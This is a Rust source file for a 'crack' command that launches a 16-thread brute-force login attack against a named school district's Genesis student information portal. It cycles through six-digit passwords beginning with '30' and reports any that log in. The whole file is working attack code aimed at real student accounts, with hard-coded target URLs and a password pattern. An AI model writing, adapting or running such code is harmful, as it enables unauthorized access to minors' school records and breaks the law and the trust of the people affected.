use std::io::Write;
use std::thread;
use std::time::Duration;
use std::time::SystemTime;
use ureq::Agent;

use super::color;
use super::color::Color;
use super::Command;

// Define Some Constants
static THREADS: u32 = 16;
static BASE_URL: &str = "https://parents.genesisedu.com/bernardsboe";
static USERNAME: &str = "@bernardsboe.com";
static PASSWORD: &str = "30####";

static mut RUNNING: bool = true;

pub fn command() -> Command {
    Command::new(
        "crack",
        "Crack A password",
        "crack student@bernardsboe.com",
        |args| {
            if args.len() <= 2 {
                color_print!(Color::Red, "[*] Not enough args suplied");
                return;
            }

            color_print!(
                Color::Green,
                "\n[*] Starting Crack on {}",
                &color::color(&args[2], Color::Blue)
            );

            // C R A C K
            crack();
        },
    )
}

// This took too long to make...
static SPINNER: [char; 10] = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];

struct Cracker {
    instance: u32,
    end_index: u32,
    start_index: u32,
    password: String,
    username: String,
    base_url: String,
}

/// 🍘
impl Cracker {
    fn new(
        instance: u32,
        end_index: u32,
        start_index: u32,
        password: &str,
        username: &str,
        base_url: &str,
    ) -> Cracker {
        Cracker {
            instance,
            end_index,
            start_index,
            password: password.to_string(),
            username: username.to_string(),
            base_url: base_url.to_string(),
        }
    }

    fn clone(self) -> Cracker {
        Cracker {
            instance: self.instance,
            end_index: self.end_index,
            start_index: self.start_index,
            password: self.password,
            username: self.username,
            base_url: self.base_url,
        }
    }
    fn start(&self) {
        // Login Page
        let page: &str = &format!("{}/sis/j_security_check", BASE_URL);

        let mut i: u32 = self.start_index as u32;
        while i < self.end_index {
            // Gen password guess
            let to_try: &str = &format!("30{:0width$}", i, width = 4);

            // Make an agent
            let agent: Agent = Agent::new();

            // Refresh Token
            agent
                .get(&format!("{}/sis/view", BASE_URL))
                .call()
                .unwrap_or(ureq::Response::new(500, "", "").unwrap());

            // Send Username and Password attempt to server
            let body = match agent
                .post(page)
                .query("j_username", &self.username)
                .query("j_password", to_try)
                .call()
            {
                Ok(body) => body.into_string().expect("Error Reading Server Response"),
                Err(_) => continue,
            };

            i += 1;

            // If not logged in try next password
            if !body.contains("Account is inactive") && !body.contains("workStudentId") {
                continue;
            }

            print!(
                "\r{} {}",
                color::color("[+] Password found:", Color::Green),
                color::color(to_try, Color::Blue)
            );

            unsafe {
                RUNNING = false;
            }
        }
    }
}

/// System of crackers working together
struct System {
    crackers: Vec<Cracker>,
    passwords: u32,
    threads: u32,
}

impl System {
    fn new(passwords: u32, threads: u32) -> System {
        System {
            crackers: Vec::new(),
            passwords,
            threads,
        }
    }

    fn add_cracker(&mut self, cracker: Cracker) {
        self.crackers.push(cracker);
    }
}

pub fn crack() {
    // Start Timer
    let start_time = SystemTime::now();

    // Make a new System
    let mut system: System = System::new(9999, THREADS);

    for i in 0..system.threads {
        let start_index = system.passwords / THREADS as u32;
        let mut end_index = start_index * (i + 1);
        if i == THREADS - 1 {
            end_index = system.passwords as u32;
        }
        system.add_cracker(Cracker::new(
            i,
            end_index,
            start_index * i,
            PASSWORD,
            USERNAME,
            BASE_URL,
        ));
    }

    for i in system.crackers {
        let cracker = i.clone();
        thread::spawn(move || {
            cracker.start();
        });
    }

    while unsafe { RUNNING } {
        for i in SPINNER.iter() {
            if unsafe { !RUNNING } {
                break;
            }
            print!(
                "{}",
                color::color(&format!("\r[{}] Cracking...", &i.to_string()), Color::Cyan)
            );
            std::io::stdout().flush().expect("Err flushing STD Out");
            thread::sleep(Duration::from_millis(100));
        }
    }
    color_print!(
        Color::Green,
        "\n[*] All Done - Took {}s",
        &start_time.elapsed().unwrap().as_secs().to_string()
    );
}
